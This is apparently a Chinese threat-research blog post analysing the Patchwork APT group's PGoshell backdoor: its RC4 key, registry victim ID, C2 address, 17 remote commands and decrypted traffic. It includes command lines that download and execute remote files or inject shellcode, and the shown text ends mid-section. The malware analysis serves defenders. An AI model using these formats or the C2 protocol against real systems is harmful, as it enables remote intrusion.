#  Patchwork(白象)APT组织PGoshell后门攻击场景复现   
原创 T0daySeeker  T0daySeeker   2024-09-19 17:21  
  
```
文章首发地址：
https://xz.aliyun.com/t/15652
文章首发作者：
T0daySeeker

```  
## 概述  
  
在前两个月，笔者关注到白象APT组织使用的最新PGoshell 后门，所以当时就尝试对其进行了详细的研究，运气比较好，大部分指令都复现成功了，同时还学习到了GO语言木马开发的一些实战经验及技巧。  
  
时隔两月，终于抽了一点空闲时间，准备将相关研究过程整理成文章，与大家一起分享。  
  
整篇文章的思路与以往一样，主要还是从攻击场景复现、通信模型剖析、远控指令详解等多角度进行剖析的。由于在攻击场景复现环节中，部分远控指令还存在植入shellcode、下载提权脚本等行为，因此，笔者在复现过程中，还尝试结合了多个第三方工具对其进行完整复现，整体还是比较有意思的。  
- 木马分析：对木马通信过程中所涉及的关键功能进行详细的剖析；  
  
- 后门攻击场景复现：尝试模拟构建PGoshell后门的控制端Demo程序，还原PGoshell后门的攻击利用场景；  
  
- 远控指令详细剖析：对17个远控指令从反编译代码、功能复现、通信模型等多角度进行详细剖析；  
  
**「为了能让大家能够更直观的对此样本的攻击场景进行实战化感受，笔者将文章中所涉及的控制端Demo程序共享于百度网盘中，大家可以关注笔者“T0daySeeker”公众号，发送“PGoshell后门”关键字获取下载链接。解压密码为“T0daySeeker”。为了避免控制端Demo程序被恶意使用，笔者对木马上线地址进行了限制：控制端Demo程序只接收192.168.XX.XX内网地址上线。」**  
## 木马分析  
### 加解密算法  
  
结合“知道创宇404实验室”发布的《威胁情报 |Patchwork 组织更新武器库，首次利用 Brute Ratel C4 和 PGoshell 增强版发起攻击》报告，我们可知PGoshell后门使用的加解密算法为RC4+base64，RC4的密钥为“0g8RXt137ODBeqPhTv2XYjgmnxUsijfc”。  
  
相关报告截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCde1ZlOI90joOqyliaQIo8C1xgqnexVtM8kogcpC9IicsVmPXxEZTmBMA/640?wx_fmt=png&from=appmsg "")  
### 受控ID  
  
通过分析，发现样本运行后，将检测HKCU\Software\Microsoft\WinTemp注册表是否存在：  
- 若存在则获取temp键的值作为受控ID；  
  
- 若不存在则生成随机字符串并加密写入，该值将作为受控ID加密存放于POST请求载荷中；  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCV5Son89LMIYALsGxbND1M3Qpxsa38riaTyXGiajNYQia7iarpWD25oWWtw/640?wx_fmt=png&from=appmsg "")  
  
相关注册表截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCfwtLNmrrTH0FU0lHKhzUfCHx347l1TvziaC6TOgBWXOp9qTMtWKC0Yw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC3WfVEPZzOAXQu1hpYg1XNicFib3wXbicDc0IhhPawpWnnJjRd4V6eyGJA/640?wx_fmt=png&from=appmsg "")  
### 外链获取公网IP  
  
通过分析，发现样本运行后，将尝试外链https://ipwho.is/地址获取公网IP，提取country_code、ip字段作为POST请求载荷中的一部分。  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCY820upiaibicfnicFJhF9SIJv5RQiaFhrJ7RdkiaD0qdgoPnP0sbaTNO5zJA/640?wx_fmt=png&from=appmsg "")  
### 远控指令  
  
在梳理PGoshell后门的远控指令时，**「笔者发现“知道创宇404实验室”报告中描述的远控指令字符串有点小问题（部分远控指令的字符串前后顺序错误），应该是分析人员直接从IDA中复制反编译字符串所致」**。  
  
因此，在这里，我将重新梳理PGoshell后门的远控指令列表：  
  
<table><thead><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);font-size: 14px;min-width: 85px;">远控指令</th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);font-size: 14px;min-width: 85px;">功能</th></tr></thead><tbody style="border-width: 0px;border-style: initial;border-color: initial;"><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">c?d????????e</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">执行shell</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">uwvtjpyvatmd</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载文件，指定保存路径</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">uijjxqdzdele</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载文件，保存至temp目录</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ppkjidlmspplloff</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载并以指定父进程执行</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">s?p????????t</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">屏幕截图</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">undhpass</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载Powershell  Bypass-UAC脚本用于绕过UAC</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ldump</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载文件，指定保存路径</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ddmwbvctslqd</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">检查文件是否存在，存在则上传被控主机中的指定文件</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">pindhdgenfhj</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载shellcode并注入至notepad.exe程序运行</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">shpjduhjenume</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">利用WMI获取共享资源信息</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">getmdjfhhkjhsdfdc</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">获取域控信息</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">sryzsmensnum</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载Solo.zip，解压执行Solo.zip中的powershell提权枚举脚本</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">setndjfnblt</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载shellcode并通过QueueUserAPC注入至notepad.exe程序运行，shellcode执行结果将临时存放于C:\Windows\Tasks\dd_Background7786329029.tmp文件中返回</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">midhenhhmidfds</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载shellcode并通过QueueUserAPC注入至notepad.exe程序运行，shellcode执行结果将临时存放于C:\Windows\Tasks\BackgroundUsingMIMI.tmp文件中返回</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">passsmkldfdmm</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL下载shellcode并通过QueueUserAPC注入至notepad.exe程序运行，shellcode执行结果将临时存放于%temp%\pasomano.tmp文件中返回</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">semnbhdndfenum</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">SMB端口扫描</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">rdptidjkeephdnmak</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">RDP端口扫描</td></tr></tbody></table>  
## 后门攻击场景复现  
  
为了能够更好的还原PGoshell后门的攻击利用场景，笔者尝试模拟构建了PGoshell后门的控制端Demo程序，目前可有效的与PGoshell后门进行交互，相关运行效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCYCatQKEia0mChWEIv2duWl8xzibdItmDWiaQRXYA029JFBk4wjfgp8UOw/640?wx_fmt=png&from=appmsg "")  
  
相关通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCRruKOGh2bialYJ116bIiauiayllGMy5icqibNHriarxLGNzz2TWJJN8N3XLg/640?wx_fmt=png&from=appmsg "")  
## 远控指令详细剖析  
  
为了能够更详细的对PGoshell后门的攻击场景进行复现，笔者准备对不同远控指令从反编译代码、功能复现、通信模型等多角度进行详细剖析。  
### 远控指令运行参数  
  
为了能够更好的对比PGoshell后门的远控指令，笔者对各远控指令的运行参数进行了梳理对比，详细情况如下：  
  
<table><thead><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);font-size: 14px;min-width: 85px;">远控指令</th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);font-size: 14px;min-width: 85px;">参数1</th><th style="border-top-width: 1px;border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);font-size: 14px;min-width: 85px;">参数2</th></tr></thead><tbody style="border-width: 0px;border-style: initial;border-color: initial;"><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">c?d????????e</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">shell命令</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">uwvtjpyvatmd</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">保存路径</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">uijjxqdzdele</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ppkjidlmspplloff</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">指定父进程PID</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">s?p????????t</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">undhpass</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ldump</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">保存路径</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">ddmwbvctslqd</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">文件路径</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">pindhdgenfhj</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">crsfsdft、apcmjudk</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">shpjduhjenume</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">getmdjfhhkjhsdfdc</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">sryzsmensnum</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">powershell脚本名</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">setndjfnblt</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">midhenhhmidfds</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">passsmkldfdmm</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">外链URL地址</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;"><br/></td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">semnbhdndfenum</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">IP范围</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">端口</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">rdptidjkeephdnmak</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">IP范围</td><td style="border-color: rgb(204, 204, 204);font-size: 14px;min-width: 85px;">端口</td></tr></tbody></table>  
### c?d????????e  
  
通过分析，发现c?d????????e远控指令功能为执行shell命令，梳理c?d????????e远控指令的命令格式如下：  
```
c?d????????e|ipconfig

```  
  
远控功能复现情况如下：（公网IP为构造的IP地址）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC5srFRQwu4JtEyicvued8bFiaWLhc9KfOPliaWDibibAfHunTtKuyC7nia9ew/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC9HPicUdf8VofTR87bQNrSb9v9thKGbozoacicc62woLs6310ibTntJBZA/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCdl7qeL6sS32lze9hdxicUktahsP1nmT44iaJ9Llw4XMEicjicwLnOSR8TA/640?wx_fmt=png&from=appmsg "")  
#### 通信模型剖析  
  
梳理c?d????????e命令的通信模型如下：  
- POST请求https://cartmizer.info/lkqnzntawldqjlwdxivsnemw地址，User-Agent为固定的QllXjxbyEvMuARVOztDiSZDNtQQb值，用于检验是否为PGoshell的通信数据；  
  
- POST请求https://cartmizer.info/lkqnzntawldqjlwdxivsnemw地址，载荷中携带主机信息，用于获取远控指令；  
  
```
#原始载荷数据
j8rlA5zQ_d8zafHyciloOqQSo7BlE5ctDsjhOUANTjqfG40uDdsQsWikG47LWGFytAsn80fezDgQyzqgjgO8-OmwZAdjK6_KQ7YhypSWwEfuYJu1cMWzRad__I4XfHuxMzTin2MgYr41-IlRJarYKeLynyXKL2eMXA8kV5vpt8hXnS0p41PcS5zhOvQ90dsd0KHp6IzkczLzr8OrQTpM4sQPDLaKH6xcgB0QXDIq0OEH

#第一层解密
1||jYDJX_3Ahshd||9v25XfO6hbRedIGoMW8-du4=||6f_XRI_Z_M0pF_rZNQ5YGrlPuOs-||6f_XRI_Z_M0pF_rZNQ5Y||6d_3DarjxKdbeuX2dShhJ6xO||jYKpWQ==||_YzFPLbxxfQwO9T3aC9QAr1YvvY_O61QFsX7Dg==||iII=

#第二层解密（公网IP为构造的IP地址）
1||36P68T1O1||HK 46.232.XXX.206||WIN-JMKXXXJC4OT\admin||WIN-JMKXXXJC4OT||Windows 7 Ultimate||3400||C:\Users\admin\Desktop\2.exe||64

```  
- POST请求响应包载荷中携带远控指令  
  
```
#原始载荷数据
3Yn9VvqriLhTZY//|18b6Bqvy3uA=||

#第一层解密
c?d????????e|ifconfig||

```  
- 继续POST请求https://cartmizer.info/lkqnzntawldqjlwdxivsnemw地址，载荷中携带远控指令响应数据  
  
- 当POST请求载荷中携带形如{"cr":"","res":"","ct":"", "tid":"", "suc":""}格式的载荷数据时，说明远控指令执行完毕  
  
```
#原始载荷数据
xZT6G-eulbZOdpLoZDIufPocttJmCIAmVtjCVhhLK1-TIvgsAtwI7SywCtLJb1xEjjJfgCrMyBcrm1rM_RrFneipV1AWerOUQg==

#第一层解密
{"cr":"1","res":"7cP6CqDnxA==","ct":"cmhyhmjdhedsf", "tid":"", "suc":"1"}

#第二层解密
{"cr":"1","res":"Success","ct":"cmhyhmjdhedsf", "tid":"", "suc":"1"}

```  
### uwvtjpyvatmd  
  
通过分析，发现uwvtjpyvatmd远控指令功能为外链URL下载文件，梳理uwvtjpyvatmd远控指令的命令格式如下：  
```
uwvtjpyvatmd|https://192.168.65.1/uwvtjpyvatmd|C:\Users\admin\Desktop\testfile.txt

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCvqxU0gvC1VyTqdia3j2RXsvLays0r7K1ZMFwvia0SPqE4kiczae1ZIVkw/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUClnSyNRk3HGLfdmzrib0njCHoTRn4yG0qAHfTKHxicaTyLLmnApaAu0tQ/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCVqcrapQZY6ZTauhPnxeKzryfiaj5xd280BnX2cf2hTDvPcRd4JfomLQ/640?wx_fmt=png&from=appmsg "")  
#### 通信模型剖析  
  
梳理uwvtjpyvatmd命令的通信模型如下：  
- POST请求https://cartmizer.info/lkqnzntawldqjlwdxivsnemw地址，User-Agent为固定的QllXjxbyEvMuARVOztDiSZDNtQQb值，用于检验是否为PGoshell的通信数据；  
  
- POST请求https://cartmizer.info/lkqnzntawldqjlwdxivsnemw地址，载荷中携带主机信息，用于获取远控指令；  
  
- POST请求响应包载荷中携带远控指令  
  
```
#原始载荷数据
y8HvHa/kzvENLt3+|1sLtGf+7mLZVaJ6rN3kicO0F5K0lPIcWUtD6HUQdahk=|/YzFPLbxxfQwO9T3aC9QAr1YvvY/O60WXdP3DUwFYlOELq4=|

#第一层解密
uwvtjpyvatmd|https://192.168.65.1/uwvtjpyvatmd|C:\Users\admin\Desktop\testfile.txt|

```  
- 根据远控指令外链URL下载文件，并保存至指定路径；  
  
- 当POST请求载荷中携带形如{"cr":"","res":"","ct":"", "tid":"", "suc":""}格式的载荷数据时，说明远控指令执行完毕  
  
```
#原始载荷数据
xZT6G-eulbZOdpLoZDIufPp0jPgWG70AQNjlOlImPinDN5kvcf4XtAyuEeHySA8QqgwZ_Dmq6QkJ4AyhmnqUi6b-GFBPLKCMHfUw47iu-WHCXqLoZKHAF99FxN9sOiWle0vzqHcxKvxcrclJ

#第一层解密
{"cr":"1","res":"_YzFPLbxxfQwO9T3aC9QAr1YvvY_O60WXdP3DUwFYlOELq4=","ct":"uwvtjpyvatmd", "tid":"", "suc":"1"}

#第二层解密
{"cr":"1","res":"C:\Users\admin\Desktop\testfile.txt","ct":"uwvtjpyvatmd", "tid":"", "suc":"1"}

```  
### ppkjidlmspplloff  
  
通过分析，发现ppkjidlmspplloff远控指令功能为外链下载文件并以指定父进程执行，梳理ppkjidlmspplloff远控指令的命令格式如下：  
```
ppkjidlmspplloff|https://192.168.65.1/uijjxqdzdele.exe|3204

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCkD4XOSEDFzUt7VlXMf2j9t94tTRicqrGJXIR3Qk3eVgibDGMJ0S7icpfw/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
